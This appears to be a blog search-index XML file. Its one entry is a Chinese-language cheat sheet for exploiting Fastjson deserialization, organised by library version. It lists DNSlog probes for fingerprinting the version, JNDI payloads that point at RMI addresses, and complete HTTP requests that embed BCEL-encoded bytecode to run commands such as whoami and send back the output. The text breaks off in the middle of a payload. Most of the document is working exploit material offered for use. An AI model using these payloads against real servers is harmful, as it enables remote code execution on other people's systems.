<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fastjson系列总结</title>
      <link href="/2021/08/31/Fastjson%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/31/Fastjson%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p>Fastjson姿势技巧集合</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>持续更新，手工yyds。</p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。<br>fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。   </p><p>主要是利用各个类被加入黑名单的方式进行判断</p><p>fastjson &gt;1.2.43</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</code></pre><p>fastjson &gt;1.2.48</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</code></pre><p>fastjson &gt;1.2.68</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&#123;"@type":"java.net.URL","val":"dnslog"&#125;:"aaa"&#125;&#123;"@type":"com.alibaba.fastjson.JSONObject", &#123;"@type": "java.net.URL", "val":"http://dnslog"&#125;&#125;Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</code></pre><h2 id="各版本利用"><a href="#各版本利用" class="headerlink" title="各版本利用"></a>各版本利用</h2><p>除了考虑Fastjson版本，还得考虑JDK版本，中high间件版本，第三方依赖版本。</p><p>JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。（更高版本也有绕过）<br>更高版本绕过可用<a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></p><ol><li>jndi<ol><li>JdbcRowSetImpl</li><li>C3p0#JndiRefForwardingDataSource</li><li>JndiDataSourceFactory</li></ol></li><li>bcel<ol><li>tomcat#dbcp</li><li>ibatis</li></ol></li><li>TemplatesImpl</li></ol><hr><h3 id="Fastjson-1-2-22-1-2-24"><a href="#Fastjson-1-2-22-1-2-24" class="headerlink" title="Fastjson 1.2.22-1.2.24"></a>Fastjson 1.2.22-1.2.24</h3><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/badClassName&quot;, &quot;autoCommit&quot;:true&#125;</code></pre><h4 id="c3p0-JndiRefForwardingDataSource"><a href="#c3p0-JndiRefForwardingDataSource" class="headerlink" title="c3p0#JndiRefForwardingDataSource"></a>c3p0#JndiRefForwardingDataSource</h4><p>JdbcRowSetImpl无法成功可以一试</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;rmi://127.0.0.1:1099/badClassName&quot;, &quot;loginTimeout&quot;:0&#125;</code></pre><h4 id="bcel"><a href="#bcel" class="headerlink" title="bcel"></a>bcel</h4><p>可用于解决不出网利用。<br>需要注意在Java 8u251以后，bcel类被删除。</p><p>tomcat7</p><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>tomcat8及其以后</p><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>Poc</p><pre><code class="java">&#123;    &#123;        &quot;x&quot;:&#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$...&quot;        &#125;    &#125;: &quot;x&quot;&#125;</code></pre><p>exp</p><p>执行命令回显.</p><pre><code class="java">POST /json HTTP/1.1Host: 127.0.0.1:9092Content-Type: application/jsoncmd: whoamiContent-Length: 3327&#123;    &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;x&quot;:&#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;        &#125;    &#125;: &quot;x&quot;&#125;</code></pre><pre><code class="java">POST /json HTTP/1.1Host: 127.0.0.1:9092Content-Type: application/jsoncmd: ver &amp;&amp; echo fastjsonContent-Length: 3327&#123;    &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;x&quot;:&#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;        &#125;    &#125;: &quot;x&quot;&#125;</code></pre><h4 id="1-2-33-lt-fastjson-lt-1-2-47"><a href="#1-2-33-lt-fastjson-lt-1-2-47" class="headerlink" title="1.2.33 &lt;= fastjson &lt;= 1.2.47"></a>1.2.33 &lt;= fastjson &lt;= 1.2.47</h4><pre><code class="java">POST /json HTTP/1.1Host: 127.0.0.1:9092Content-Type: application/jsoncmd: whoamiContent-Length: 3647&#123;    &quot;xx&quot;:    &#123;        &quot;@type&quot; : &quot;java.lang.Class&quot;,        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x&quot; : &#123;        &quot;name&quot;: &#123;            &quot;@type&quot; : &quot;java.lang.Class&quot;,            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;            &#125;        &#125; : &quot;xxx&quot;    &#125;&#125;</code></pre><p>1.2.33&lt;=fastjson&lt;=12.36</p><pre><code class="java">&#123;    &quot;name&quot;:    &#123;        &quot;@type&quot; : &quot;java.lang.Class&quot;,        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x&quot; : &#123;        &quot;name&quot;: &#123;            &quot;@type&quot; : &quot;java.lang.Class&quot;,            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &#123;            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                